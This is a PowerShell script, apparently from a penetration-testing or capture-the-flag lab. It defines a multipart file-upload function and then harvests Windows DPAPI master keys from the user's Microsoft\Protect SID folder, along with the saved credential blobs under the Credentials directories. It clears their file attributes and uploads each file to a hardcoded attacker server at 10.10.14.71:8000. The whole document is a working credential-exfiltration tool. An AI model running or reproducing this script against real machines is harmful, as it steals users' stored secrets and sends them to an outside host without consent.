<#

PowerShell Script to upload files using uploadserver module 
Github: https://github.com/Densaugeo/uploadserver

To execute the server run in your Linux Machine:
pip3 install uploadserver
python3 -m uploadserver

Example PS:
Invoke-FileUpload -File C:\Users\plaintext\Desktop\20200717080254_BloodHound.zip -Uri http://192.168.49.128:8000/upload

References: https://gist.github.com/arichika/91a8b1f60c87512401e320a614099283

#>

function Invoke-FileUpload {
	Param (
		[Parameter(Position = 0, Mandatory = $True)]
		[String]$File,
		
		[Parameter(Position = 1, Mandatory = $True)]
		[String]$Uri
		)
	
	$FileToUpload = Get-ChildItem -File "$File"
	
	$UTF8woBOM = New-Object "System.Text.UTF8Encoding" -ArgumentList @($false)
	$boundary = '----BCA246E0-E2CF-48ED-AACE-58B35D68B513'
	$tempFile = New-TemporaryFile
	Remove-Item $tempFile -Force -ErrorAction Ignore
	$sw = New-Object System.IO.StreamWriter($tempFile, $true, $UTF8woBOM)
	$fileName = [System.IO.Path]::GetFileName($FileToUpload.FullName)
	$sw.Write("--$boundary`r`nContent-Disposition: form-data;name=`"files`";filename=`"$fileName`"`r`n`r`n")
	$sw.Close()
	$fs = New-Object System.IO.FileStream($tempFile, [System.IO.FileMode]::Append)
	$bw = New-Object System.IO.BinaryWriter($fs)
	$fileBinary = [System.IO.File]::ReadAllBytes($FileToUpload.FullName)
	$bw.Write($fileBinary)
	$bw.Close()
	$sw = New-Object System.IO.StreamWriter($tempFile, $true, $UTF8woBOM)
	$sw.Write("`r`n--$boundary--`r`n")
	$sw.Close()
	
	Invoke-RestMethod -Method POST -Uri $uri -ContentType "multipart/form-data; boundary=$boundary" -InFile $tempFile
	
	$FileHash = Get-FileHash -Path "$File" -Algorith MD5 
	Write-Host "[+] File Uploaded: " $FileToUpload.FullName
	Write-Host "[+] FileHash: " $FileHash.Hash
}

# Define the directories to target
$paths = @(
    "$env:APPDATA\Microsoft\Protect",
    "$env:LOCALAPPDATA\Microsoft\Credentials",
    "$env:APPDATA\Microsoft\Credentials"
)

foreach ($basePath in $paths) {
    Write-Host "`n[+] Checking path: $basePath"

    if (-not (Test-Path $basePath)) {
        Write-Host "[!] Directory not found: $basePath"
        continue
    }

    # Special handling for Microsoft\Protect
    if ($basePath -like "*\Microsoft\Protect") {
        # Look for the SID-named subdirectory
        $sidFolder = Get-ChildItem -Path $basePath -Directory -Force | Where-Object {
            $_.Name -match '^S-1-5-21-\d{9,}-\d+-\d+-\d+$'
        } | Select-Object -First 1

        if (-not $sidFolder) {
            Write-Host "[!] No SID folder found in: $basePath"
            continue
        }

        Write-Host "[*] Found SID folder: $($sidFolder.Name)"
        $files = Get-ChildItem -Path $sidFolder.FullName -File -Recurse -Force -ErrorAction SilentlyContinue
    } else {
        # For other paths, get all files recursively
        $files = Get-ChildItem -Path $basePath -File -Recurse -Force -ErrorAction SilentlyContinue
    }

    if (-not $files -or $files.Count -eq 0) {
        Write-Host "[!] No files found to process in: $basePath"
        continue
    }

    Write-Host "[*] Found $($files.Count) file(s) to process in: $basePath"

    foreach ($file in $files) {
        try {
            Write-Host "[>] Processing file: $($file.FullName)"
            Set-ItemProperty -Path $file.FullName -Name Attributes -Value 'Normal'
            Write-Host "    [-] Attributes set to 'Normal'"
            Invoke-FileUpload -Uri "http://10.10.14.71:8000/upload" -File $file.FullName
            Write-Host "    [+] File uploaded successfully"
        } catch {
            Write-Warning "    [x] Failed to process $($file.FullName): $_"
        }
    }
}

